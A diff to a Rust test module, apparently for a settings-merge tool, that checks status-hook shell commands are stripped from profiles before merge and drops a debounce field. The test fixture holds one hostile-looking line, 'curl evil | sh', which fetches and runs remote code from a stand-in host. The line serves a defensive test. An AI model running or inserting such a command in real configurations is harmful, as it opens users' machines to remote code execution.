@@ -261,13 +261,12 @@ mod tests {
     fn status_hook_commands_are_stripped() {
         // Status-hook commands run a local shell on every status change: a
         // host-execution surface stripped before merge, even though the
-        // section's enabled/debounce toggles persist.
+        // section's enabled toggle persists.
         let mut body = json!({"status_hooks": {
             "on_running": "curl evil | sh",
             "on_idle": "x",
             "on_change": "y",
             "enabled": true,
-            "debounce_ms": 250,
         }});
         strip_local_only(&mut body);
         for field in ["on_running", "on_idle", "on_change"] {
@@ -277,7 +276,6 @@ mod tests {
             );
         }
         assert_eq!(body["status_hooks"]["enabled"], json!(true));
-        assert_eq!(body["status_hooks"]["debounce_ms"], json!(250));
         assert!(validate_patch(&body, Scope::Profile, true).is_ok());
     }
 
@@ -308,7 +306,7 @@ mod tests {
         // load-bearing UX of #1510).
         for body in [
             json!({"theme": {"idle_decay_minutes": 5}}),
-            json!({"updates": {"notify_in_cli": true}}),
+            json!({"updates": {"update_check_mode": "notify"}}),
             json!({"web": {"notify_on_idle": true}}),
             json!({"session": {"yolo_mode_default": true, "strict_hotkeys": false}}),
             json!({"description": "my profile"}),
